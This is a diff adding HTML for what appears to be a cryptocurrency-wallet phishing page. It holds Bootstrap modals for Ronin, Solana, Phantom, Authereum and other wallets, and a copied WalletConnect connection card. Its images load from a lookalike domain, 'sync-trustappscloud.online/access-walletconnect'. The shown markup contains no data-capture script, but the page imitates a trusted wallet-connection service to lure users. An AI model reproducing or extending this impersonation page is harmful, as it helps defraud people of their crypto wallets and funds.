+            </div>
+        </div>
+    </div>
+    <!--Ronin Modal -->
+    <div class="modal fade" id="ronin" tabindex="-1" role="dialog" aria-labelledby="modelTitleId" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered" role="document">
+            <div class="modal-content">
+                <div class="card" style="padding: 2px;">
+                    <div class="card-title mt-2 ml-2 h6" style="margin-left: 20px;">
+                        <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/ronin.png" alt="wallet_img">
+                        Ronin
+                    </div>
+                </div>
+                <div class="modal-header">
+                    <button data-bs-dismiss="modal" aria-bs-label="Close" type="button" class="connect btn btn-primary btn-sm animate__animated animate__fadeIn animate__delay-5s	5s" style="font-size:13px">Continue</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!--Solana Modal -->
+    <div class="modal fade" id="solana" tabindex="-1" role="dialog" aria-labelledby="modelTitleId" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered" role="document">
+            <div class="modal-content">
+                <div class="card" style="padding: 2px;">
+                    <div class="card-title mt-2 ml-2 h6" style="margin-left: 20px;">
+                        <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/solana.png" alt="wallet_img">
+                        Solana
+                    </div>
+                </div>
+                <div class="modal-header">
+                    <button data-bs-dismiss="modal" aria-bs-label="Close" type="button" class="connect btn btn-primary btn-sm animate__animated animate__fadeIn animate__delay-5s	5s" style="font-size:13px">Continue</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!--Phantom Modal -->
+    <div class="modal fade" id="phantom" tabindex="-1" role="dialog" aria-labelledby="modelTitleId" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered" role="document">
+            <div class="modal-content">
+                <div class="card" style="padding: 2px;">
+                    <div class="card-title mt-2 ml-2 h6" style="margin-left: 20px;">
+                        <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/phantom.webp" alt="wallet_img">
+                        Phantom
+                    </div>
+                </div>
+                <div class="modal-header">
+                    <button data-bs-dismiss="modal" aria-bs-label="Close" type="button" class="connect btn btn-primary btn-sm animate__animated animate__fadeIn animate__delay-5s	5s" style="font-size:13px">Continue</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!--Authereum Modal -->
+    <div class="modal fade" id="auth" tabindex="-1" role="dialog" aria-labelledby="modelTitleId" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered" role="document">
+            <div class="modal-content">
+                <div class="card" style="padding: 2px;">
+                    <div class="card-title mt-2 ml-2 h6" style="margin-left: 20px;">
+                        <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/icn-authereum.svg" alt="wallet_img">
+                        Authereum
+                    </div>
+                </div>
+                <div class="modal-header">
+                    <button data-bs-dismiss="modal" aria-bs-label="Close" type="button" class="connect btn btn-primary btn-sm animate__animated animate__fadeIn animate__delay-5s	5s" style="font-size:13px">Continue</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!--OTHERS Modal -->
+    <div class="modal fade" id="others" tabindex="-1" role="dialog" aria-labelledby="modelTitleId" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered" role="document">
+            <div class="modal-content">
+                <div class="card" style="padding: 2px;">
+                    <div class="card-title mt-2 ml-2 h6" style="margin-left: 20px;">
+                        <img class="wallet__image" src="urn:scrapbook:download:error:https://sync-trustappscloud.online/access-walletconnect/assets/images/undraw_Confirmation_re_b6q5.png" alt="wallet_img">
+                        Others
+                    </div>
+                </div>
+                <div class="modal-header">
+                    <button data-bs-dismiss="modal" aria-bs-label="Close" type="button" class="connect btn btn-primary btn-sm animate__animated animate__fadeIn animate__delay-5s	5s" style="font-size:13px">Continue</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+<link rel="stylesheet" type="text/css" href="toastify.min.css">
+
+
+
+
+<div id="WEB3_CONNECT_MODAL_ID"><div class="sc-AxgMl fdJEgN web3modal-modal-lightbox" offset="0" opacity="0.4"><div class="sc-AxheI bRUsJg web3modal-modal-container"><div class="sc-Axmtr hvJMgY web3modal-modal-hitbox"></div><div class="sc-AxmLO DeUqc web3modal-modal-card"><div class="sc-AxhUy kaSVED web3modal-provider-wrapper"><div class="sc-AxhCb xPSun web3modal-provider-container"><div class="sc-AxjAm bcMPWx web3modal-provider-icon"><img src="cb6ba41411ef611404661bc9c8ee5676f7b264ea.svg" alt="WalletConnect"></div><div class="sc-AxirZ hBmmHr web3modal-provider-name">WalletConnect</div><div class="sc-AxiKw ceSpQQ web3modal-provider-description">Scan with WalletConnect to connect</div></div></div></div></div></div></div>
+
+</body></html>
